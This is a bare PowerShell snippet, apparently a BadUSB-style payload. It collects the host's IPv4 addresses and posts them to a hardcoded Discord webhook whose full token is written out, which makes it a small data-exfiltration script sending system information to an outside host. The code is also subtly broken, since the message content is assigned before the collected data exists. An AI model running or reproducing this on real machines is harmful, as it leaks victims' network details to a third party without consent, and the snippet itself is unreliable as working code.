$hookUrl = 'https://discord.com/api/webhooks/1119490551876681748/7YQxwQb8t04JAf_t_EZXSL0ZW5zXXp1J3ljVmJM67NdSjGtxp8qR4VCrGH7gWb_t7BYn'
$content = data
$data = Get-NetIPAddress -AddressFamily IPV4
$payload = [PSCustomObject]@{ content = $content }
Invoke-RestMethod -Uri $hookUrl -Method Post -Body ($payload | ConvertTo-Json)
